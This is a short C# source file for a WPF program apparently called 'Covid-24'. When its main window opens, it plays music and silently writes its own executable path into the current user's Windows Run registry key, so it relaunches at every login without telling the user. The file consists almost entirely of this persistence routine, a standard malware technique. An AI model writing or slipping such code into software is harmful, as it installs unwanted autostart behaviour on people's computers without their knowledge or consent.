using Microsoft.Win32;
using System;
using System.Reflection;
using Covid_24.Sound;
using System.Windows;

namespace Covid_24
{
    public class Persistence
    {
        public Persistence()
        {
            try
            {
                string executablePath = Assembly.GetExecutingAssembly().Location.Replace(".dll", ".exe");

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("Covid-24", "\"" + executablePath + "\"");
                }

                Console.WriteLine("Persistence set successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        MusicPlayer _player;
        public MainWindow()
        {
            _player = new MusicPlayer();
            _player.Play();

            Persistence persistence = new Persistence();
            InitializeComponent();
        }
    }
}
